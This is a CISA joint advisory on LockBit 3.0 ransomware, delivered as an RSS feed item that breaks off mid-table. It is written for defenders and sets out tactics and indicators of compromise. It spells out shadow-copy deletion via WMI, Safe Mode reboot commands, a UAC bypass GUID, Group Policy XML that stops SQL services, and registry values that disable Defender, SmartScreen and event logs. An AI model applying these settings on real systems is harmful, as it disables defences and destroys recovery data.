## ?xml
## @version
1.0
## @encoding
utf-8
## rss
## @xmlns:dc
http://purl.org/dc/elements/1.1/
## @version
2.0
## @xml:base
https://www.cisa.gov/
## channel
## title
CISA Cybersecurity Advisories
## link
https://www.cisa.gov/
## description

## language
en
## item
## -
## title
#StopRansomware: LockBit 3.0
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
## description
<h4><strong>SUMMARY</strong></h4>
<p><em>Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p><strong>Actions to take today to mitigate cyber threats from ransomware:</strong></p>
<ul><li>Prioritize remediating <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a>.</li>
<li>Train users to recognize and report <a href="https://www.cisa.gov/phishing-infographic">phishing attempts</a>.</li>
<li>Enable and enforce phishing- resistant <a href="https://www.cisa.gov/mfa">multifactor authentication</a>.</li>
</ul><p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing & Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known LockBit 3.0 ransomware IOCs and TTPs identified through FBI investigations as recently as March 2023.</p>
<p>The LockBit 3.0 ransomware operations function as a Ransomware-as-a-Service (RaaS) model and is a continuation of previous versions of the ransomware, LockBit 2.0, and LockBit. Since January 2020, LockBit has functioned as an affiliate-based ransomware variant; affiliates deploying the LockBit RaaS use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations, which can make effective computer network defense and mitigation challenging.</p>
<p>The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report: </p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-075a-stop-ransomware-lockbit.pdf" class="c-file__link" target="_blank">#StopRansomware: Lockbit</a>
    <span class="c-file__size">(PDF,       688.70 KB
  )</span>
  </div>
</div>
<h4><strong>TECHNICAL DETAILS</strong></h4>
<p><em>Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to <a href="https://attack.mitre.org/versions/v12/matrices/enterprise/">MITRE ATT&CK for Enterprise</a>.</em></p>
<h5>CAPABILITIES</h5>
<p>LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.</p>
<p>LockBit 3.0 is configured upon compilation with many different options that determine the behavior of the ransomware. Upon the actual execution of the ransomware within a victim environment, various arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit 3.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate does not have access to passwordless LockBit 3.0 ransomware, then a password argument is mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware [<a href="https://attack.mitre.org/versions/v12/techniques/T1480/001/">T1480.001</a>]. The password is a cryptographic key which decodes the LockBit 3.0 executable. By protecting the code in such a manner, LockBit 3.0 hinders malware detection and analysis with the code being unexecutable and unreadable in its encrypted form. Signature-based detections may fail to detect the LockBit 3.0 executable as the executable’s encrypted potion will vary based on the cryptographic key used for encryption while also generating a unique hash. When provided the correct password, LockBit 3.0 will decrypt the main component, continue to decrypt or decompress its code, and execute the ransomware.</p>
<p>LockBit 3.0 will only infect machines that do not have language settings matching a defined exclusion list. However, whether a system language is checked at runtime is determined by a configuration flag originally set at compilation time. Languages on the exclusion list include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected [<a href="https://attack.mitre.org/versions/v12/techniques/T1614/001/">T1614.001</a>], LockBit 3.0 will stop execution without infecting the system.</p>
<h5>INITIAL ACCESS</h5>
<p>Affiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation [<a href="https://attack.mitre.org/versions/v12/techniques/T1133/">T1133</a>], drive-by compromise [<a href="https://attack.mitre.org/versions/v12/techniques/T1189/">T1189</a>], phishing campaigns [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/">T1566</a>], abuse of valid accounts [<a href="https://attack.mitre.org/versions/v12/techniques/T1078/">T1078</a>], and exploitation of public-facing applications [<a href="https://attack.mitre.org/versions/v12/techniques/T1190/">T1190</a>].</p>
<h5>EXECUTION AND INFECTION PROCESS</h5>
<p>During the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the required privileges [<a href="https://attack.mitre.org/versions/v12/tactics/TA0004/">TA0004</a>]. LockBit 3.0 performs functions such as:</p>
<ul><li>Enumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices [<a href="https://attack.mitre.org/versions/v12/techniques/T1082/">T1082</a>]</li>
<li>Terminating processes and services [<a href="https://attack.mitre.org/versions/v12/techniques/T1489/">T1489</a>]</li>
<li>Launching commands [<a href="https://attack.mitre.org/versions/v12/tactics/TA0002/">TA0002</a>]</li>
<li>Enabling automatic logon for persistence and privilege escalation [<a href="https://attack.mitre.org/versions/v12/techniques/T1547/">T1547</a>]</li>
<li>Deleting log files, files in the recycle bin folder, and shadow copies residing on disk [<a href="https://attack.mitre.org/versions/v12/techniques/T1485/">T1485</a>], [<a href="https://attack.mitre.org/versions/v12/techniques/T1490/">T1490</a>]</li>
</ul><p>LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges [<a href="https://attack.mitre.org/versions/v12/techniques/T1078/002/">T1078</a>]. When compiled, LockBit 3.0 may also enable options for spreading via Group Policy Objects and PsExec using the Server Message Block (SMB) protocol. LockBit 3.0 attempts to encrypt [<a href="https://attack.mitre.org/versions/v12/techniques/T1486/">T1486</a>] data saved to any local or remote device, but skips files associated with core system functions.</p>
<p>After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <strong><Ransomware ID>.README.txt</strong> and changes the host’s wallpaper and icons to LockBit 3.0 branding [<a href="https://attack.mitre.org/versions/v12/techniques/T1491/001/">T1491.001</a>]. If needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2) server [<a href="https://attack.mitre.org/versions/v12/techniques/T1027/">T1027</a>].</p>
<p>Once completed, LockBit 3.0 may delete itself from the disk [<a href="https://attack.mitre.org/versions/v12/techniques/T1070/004/">T1070.004</a>] as well as any Group Policy updates that were made, depending on which options were set at compilation time.</p>
<h5>EXFILTRATION</h5>
<p>LockBit 3.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2.0 [<a href="https://attack.mitre.org/versions/v12/tactics/TA0010/">TA0010</a>]; rclone, an open-source command line cloud storage manager [<a href="https://attack.mitre.org/versions/v12/techniques/T1567/002/">T1567.002</a>]; and publicly available file sharing services, such as MEGA [<a href="https://attack.mitre.org/versions/v12/techniques/T1567/002/">T1567.002</a>], to exfiltrate sensitive company data files prior to encryption. While rclone and many publicly available file sharing services are primarily used for legitimate purposes, they can also be used by threat actors to aid in system compromise, network exploration, or data exfiltration. LockBit 3.0 affiliates often use other publicly available file sharing services to exfiltrate data as well [<a href="https://attack.mitre.org/versions/v12/techniques/T1567/002/">T1567</a>] (see Table 1).</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><strong><em>Table 1: Anonymous File Sharing Sites Used to Exfiltrate Data Before System Encryption</em></strong></caption>
<thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist"><strong><u>File Sharing Site</u></strong></th>
</tr></thead><tbody><tr><td>https://www.premiumize[.]com</td>
</tr><tr><td>https://anonfiles[.]com</td>
</tr><tr><td>https://www.sendspace[.]com</td>
</tr><tr><td>https://fex[.]net</td>
</tr><tr><td>https://transfer[.]sh</td>
</tr><tr><td>https://send.exploit[.]in</td>
</tr></tbody></table><h5>LEVERAGING FREEWARE AND OPEN-SOURCE TOOLS</h5>
<p>LockBit affiliates have been observed using various freeware and open-source tools during their intrusions. These tools are used for a range of activities such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scripts<br />
are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations:</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 2: Freeware and Open-Source Tools Used by LockBit 3.0 Affiliates</em></caption>
<thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist"><strong>Tool</strong></th>
<th scope="col" role="columnheader"><strong>Description</strong></th>
<th scope="col" role="columnheader"><strong>MITRE ATT&CK ID</strong></th>
</tr></thead><tbody><tr><td>Chocolatey</td>
<td>Command-line package manager for Windows.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1072/">T1072</a></td>
</tr><tr><td>FileZilla</td>
<td>Cross-platform File Transfer Protocol (FTP) application.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1071/002/">T1071.002</a></td>
</tr><tr><td>Impacket</td>
<td>Collection of Python classes for working with network protocols.</td>
<td><a href="https://attack.mitre.org/versions/v12/software/S0357/">S0357</a></td>
</tr><tr><td>MEGA Ltd MegaSync</td>
<td>Cloud-based synchronization tool.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1567/002/">T1567.002</a></td>
</tr><tr><td>Microsoft Sysinternals ProcDump</td>
<td>Generates crash dumps. Commonly used to dump the contents of Local Security Authority Subsystem Service, LSASS.exe.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1003/001/">T1003.001</a></td>
</tr><tr><td>Microsoft Sysinternals PsExec</td>
<td>Execute a command-line process on a remote machine.</td>
<td><a href="https://attack.mitre.org/versions/v12/software/S0029/">S0029</a></td>
</tr><tr><td>Mimikatz</td>
<td>Extracts credentials from system.</td>
<td><a href="https://attack.mitre.org/versions/v12/software/S0002/">S0002</a></td>
</tr><tr><td>Ngrok</td>
<td>Legitimate remote-access tool abused to bypass victim network protections.</td>
<td><a href="https://attack.mitre.org/versions/v12/software/S0508/">S0508</a></td>
</tr><tr><td>PuTTY Link (Plink)</td>
<td>Can be used to automate Secure Shell (SSH) actions on Windows.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1572/">T1572</a></td>
</tr><tr><td>Rclone</td>
<td>Command-line program to manage cloud storage files</td>
<td><a href="https://attack.mitre.org/versions/v12/software/S1040/">S1040</a></td>
</tr><tr><td>SoftPerfect Network Scanner</td>
<td>Performs network scans.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1046/">T1046</a></td>
</tr><tr><td>Splashtop</td>
<td>Remote-desktop software.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1021/001/">T1021.001</a></td>
</tr><tr><td>WinSCP</td>
<td>SSH File Transfer Protocol client for Windows.</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1048/">T1048</a></td>
</tr></tbody></table><h6>Indicators of Compromise (IOCs)</h6>
<p>The IOCs and malware characteristics outlined below were derived from field analysis. The following samples are current as of March 2023.</p>
<p><em><strong>LockBit 3.0 Black Icon</strong></em></p>
  
  
  
  
<figure class="c-figure c-figure--large c-figure--image  u-align-left" role="group"><div class="c-figure__media">  <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/large/public/2023-03/picture1_0.jpg?itok=B28eB1c9" width="50" height="38" alt="LockBit 3.0 black icon." /></div>
  </figure><p> </p>
<p> </p>
<p><em><strong>LockBit 3.0 Wallpaper</strong></em></p>
  
  
  
  
<figure class="c-figure c-figure--large c-figure--image  u-align-left" role="group"><div class="c-figure__media">  <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/large/public/2023-03/picture2.jpg?itok=eYzrYF9B" width="643" height="175" alt="Rectangular wallpaper reading "LockBit Black: All your important files are stolen and encrypted! You must find [blank].README.text file and follow the instruction!"" /></div>
  </figure><p> </p>
<p> </p>
<p> </p>
<p><em><strong>LockBit Command Line Parameters</strong></em></p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist"><strong>LockBit Parameters</strong></th>
<th scope="col" role="columnheader"><strong>Description</strong></th>
</tr></thead><tbody><tr><td>
<pre>
-del</pre></td>
<td>Self-delete.</td>
</tr><tr><td>
<pre>
-gdel</pre></td>
<td>Remove LockBit 3.0 group policy changes.</td>
</tr><tr><td>
<pre>
-gspd</pre></td>
<td>Spread laterally via group policy.</td>
</tr><tr><td>
<pre>
-pass (32 character value)</pre></td>
<td>(Required) Password used to launch LockBit 3.0.</td>
</tr><tr><td>
<pre>
-path (File or path)</pre></td>
<td>Only encrypts provided file or folder.</td>
</tr><tr><td>
<pre>
-psex</pre></td>
<td>Spread laterally via admin shares.</td>
</tr><tr><td>
<pre>
-safe</pre></td>
<td>Reboot host into Safe Mode.</td>
</tr><tr><td>
<pre>
-wall</pre></td>
<td>Sets LockBit 3.0 Wallpaper and prints out LockBit 3.0 ransom note.</td>
</tr></tbody></table><h6>Mutual Exclusion Object (Mutex) Created</h6>
<p>When executed, LockBit 3.0 will create the mutex, Global\<MD4 hash of machine GUID>,<br />
and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.</p>
<h6>UAC Bypass via Elevated COM Interface</h6>
<p>LockBit 3.0 is capable of bypassing User Account Control (UAC) to execute code with elevated privileges via elevated Component Object Model (COM) Interface. <strong>C:\Windows\System32\dllhost.exe</strong> is spawned with high integrity with the command line GUID <strong>3E5FC7F9-9A51-4367-9063-A120244FBEC</strong>.</p>
<p>For example, <strong>%SYSTEM32%\dllhost.exe/Processid:{3E5FC7F9-9A51-4367-9063- A120244FBEC7}</strong>.</p>
<h6>Volume Shadow Copy Deletion</h6>
<p>LockBit 3.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow Copies. LockBit 3.0 uses <strong>select * from Win32_ShadowCopy</strong> to query for Volume Shadow copies, <strong>Win32_ShadowCopy.ID</strong> to obtain the ID of the shadow copy, and <strong>DeleteInstance</strong> to delete any shadow copies.</p>
<h6>Registry Artifacts</h6>
<p><em><strong>LockBit 3.0 Icon</strong></em></p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Registry Key</th>
<th scope="col" role="columnheader">Value</th>
<th scope="col" role="columnheader">Data</th>
</tr></thead><tbody><tr><td>
<pre>
HKCR\. <Malware Extension></pre></td>
<td>
<pre>
(Default)</pre></td>
<td>
<pre>
<Malware Extension></pre></td>
</tr><tr><td>
<pre>
HKCR\<Malware
Extension>\DefaultIcon</pre></td>
<td>
<pre>
(Default)</pre></td>
<td>
<pre>
C:\ProgramData\<Mal
ware Extension>.ico</pre></td>
</tr></tbody></table><p><strong><em>LockBit 3.0 Wallpaper</em></strong></p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Registry Key</th>
<th scope="col" role="columnheader">Value</th>
<th scope="col" role="columnheader">Data</th>
</tr></thead><tbody><tr><td>
<pre>
HKCU\Control Panel\Desktop\WallPaper</pre></td>
<td>
<pre>
(Default)</pre></td>
<td>
<pre>
C:\ProgramData\<Mal ware Extension>.bmp</pre></td>
</tr></tbody></table><p><strong><em>Disable Privacy Settings Experience</em></strong></p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Registry Key</th>
<th scope="col" role="columnheader">Value</th>
<th scope="col" role="columnheader">Data</th>
</tr></thead><tbody><tr><td>
<pre>
SOFTWARE\Policies\Microsoft\Win
dows\OOBE</pre></td>
<td>
<pre>
DisablePrivacyE
xperience</pre></td>
<td>0</td>
</tr></tbody></table><p><strong><em>Enable Automatic Logon</em></strong></p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Registry Key</th>
<th scope="col" role="columnheader">Value</th>
<th scope="col" role="columnheader">Data</th>
</tr></thead><tbody><tr><td>
<pre>
SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon</pre></td>
<td>
<pre>
AutoAdminLogon</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
 </pre></td>
<td>
<pre>
DefaultUserName</pre></td>
<td>
<pre>
<username></pre></td>
</tr><tr><td>
<pre>
 </pre></td>
<td>
<pre>
DefaultDomainNa
me</pre></td>
<td>
<pre>
<domain name></pre></td>
</tr><tr><td>
<pre>
 </pre></td>
<td>
<pre>
DefaultPassword</pre></td>
<td>
<pre>
<password></pre></td>
</tr></tbody></table><p><strong><em>Disable and Clear Windows Event Logs</em></strong></p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Registry Key</th>
<th scope="col" role="columnheader">Value</th>
<th scope="col" role="columnheader">Data</th>
</tr></thead><tbody><tr><td>
<pre>
HKLM\SOFTWARE\Microsoft\Windows
\CurrentVersion\WINEVT\Channels
\*</pre></td>
<td>
<pre>
Enabled</pre></td>
<td>
<pre>
0</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Microsoft\Windows
\CurrentVersion\WINEVT\Channels
\* \ChannelAccess</pre></td>
<td>
<pre>
ChannelAccess</pre></td>
<td>
<pre>
AO:BAG:SYD:(A;;0x1;;
;SY)(A;;0x5;;;BA)(A;
;0x1;;;LA)</pre></td>
</tr></tbody></table><h6>Ransom Locations</h6>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">LockBit 3.0 File Path Locations</th>
</tr></thead><tbody><tr><td>
<pre>
ADMIN$\Temp\<LockBit3.0 Filename>.exe</pre></td>
</tr><tr><td>
<pre>
%SystemRoot%\Temp\<LockBit3.0 Filename>.exe</pre></td>
</tr><tr><td>
<pre>
\<Domain Name>\sysvol\<Domain Name>\scripts\<Lockbit 3.0
Filename>.exe (Domain Controller)</pre></td>
</tr></tbody></table><h6>Safe Mode Launch Commands</h6>
<p>LockBit 3.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon the host operating system, the following command is launched to reboot the system to Safe Mode with Networking:</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Operating System</th>
<th scope="col" role="columnheader">Safe Mode with Networking command</th>
</tr></thead><tbody><tr><td>Vista and newer</td>
<td>
<pre>
bcdedit /set {current} safeboot network</pre></td>
</tr><tr><td>Pre-Vista</td>
<td>
<pre>
bootcfg /raw /a /safeboot:network /id 1</pre></td>
</tr></tbody></table><table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Operating System</th>
<th scope="col" role="columnheader">Disable Safe mode reboot</th>
</tr></thead><tbody><tr><td>Vista and newer</td>
<td>
<pre>
bcdedit /deletevalue {current} safeboot</pre></td>
</tr><tr><td>Pre-Vista</td>
<td>
<pre>
bootcfg /raw /fastdetect /id 1</pre></td>
</tr></tbody></table><h6>Group Policy Artifacts</h6>
<p>The following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3.0 infection:</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">NetworkShares.xml</th>
</tr></thead><tbody><tr><td><?xml version="1.0" encoding="utf-8"?><br />
			<NetworkShareSettings clsid="{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}"><br />
			<NetShare clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"<br />
			image="2" name="%%ComputerName%%_D" changed="%s" uid="%s"><br />
			<Properties action="U" name="%%ComputerName%%_D" path="D:" comment="" allRegular="0" allHidden="0" allAdminDrive="0" limitUsers="NO_CHANGE" abe="NO_CHANGE"/></td>
</tr></tbody></table><p><strong>Services.xml</strong> stops and disables services on the Active Directory (AD) hosts.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Services.xml</th>
</tr></thead><tbody><tr><td><?xml version="1.0" encoding="utf-8"?><br />
			<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}"><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQLPBDMS" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQLPBDMS" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQLPBENGINE" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQLPBENGINE" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="MSSQLFDLauncher" image="4" changed="%s" uid="%s" userContext="0" removePolicy="0" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="MSSQLFDLauncher" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQLSERVERAGENT" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQLSERVERAGENT" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="MSSQLServerOLAPService" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="MSSQLServerOLAPService" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SSASTELEMETRY" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SSASTELEMETRY" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQLBrowser" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQLBrowser" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQL Server Distributed Replay Client" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQL Server Distributed Replay Client" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQL Server Distributed Replay Controller" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQL Server Distributed Replay Controller" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="MsDtsServer150" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="MsDtsServer150" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SSISTELEMETRY150" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SSISTELEMETRY150" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SSISScaleOutMaster150" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SSISScaleOutMaster150" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SSISScaleOutWorker150" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SSISScaleOutWorker150" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="MSSQLLaunchpad" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="MSSQLLaunchpad" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQLWriter" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQLWriter" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="SQLTELEMETRY" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="SQLTELEMETRY" serviceAction="STOP" timeout="30"/><br />
			</NTService><br />
			<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"<br />
			name="MSSQLSERVER" image="4" changed="%s" uid="%s" disabled="0"><br />
			<Properties startupType="DISABLED" serviceName="MSSQLSERVER" serviceAction="STOP" timeout="60"/><br />
			</NTService><br />
			</NTServices></td>
</tr></tbody></table><h6>Registry.pol</h6>
<p>The following registry configuration changes values for the Group Policy refresh time, disable SmartScreen, and disable Windows Defender.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Registry Key</th>
<th scope="col" role="columnheader">Registry Value</th>
<th scope="col" role="columnheader">Value type</th>
<th scope="col" role="columnheader">Data</th>
</tr></thead><tbody><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s\System</pre></td>
<td>
<pre>
GroupPolicyRefresh
TimeDC</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s\System</pre></td>
<td>
<pre>
GroupPolicyRefresh
TimeOffsetDC</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s\System</pre></td>
<td>
<pre>
GroupPolicyRefresh
Time</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s\System</pre></td>
<td>
<pre>
GroupPolicyRefresh
TimeOffset</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s\System</pre></td>
<td>
<pre>
EnableSmartScreen</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
0</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s\System</pre></td>
<td>
<pre>
**del.ShellSmartSc
reenLevel</pre></td>
<td>
<pre>
REG_S
Z</pre></td>
<td>
<pre>
 </pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s Defender</pre></td>
<td>
<pre>
DisableAntiSpyware</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s Defender</pre></td>
<td>
<pre>
DisableRoutinelyTa
kingAction</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s Defender\Real-Time Protection</pre></td>
<td>
<pre>
DisableRealtimeMon
itoring</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s Defender\Real-Time Protection</pre></td>
<td>
<pre>
DisableBehaviorMon
itoring</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
1</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s Defender\Spynet</pre></td>
<td>
<pre>
SubmitSamplesConse
nt</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
2</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
s Defender\Spynet</pre></td>
<td>
<pre>
SpynetReporting</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
0</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
sFirewall\DomainProfile</pre></td>
<td>
<pre>
EnableFirewall</pre></td>
<td>
<pre>
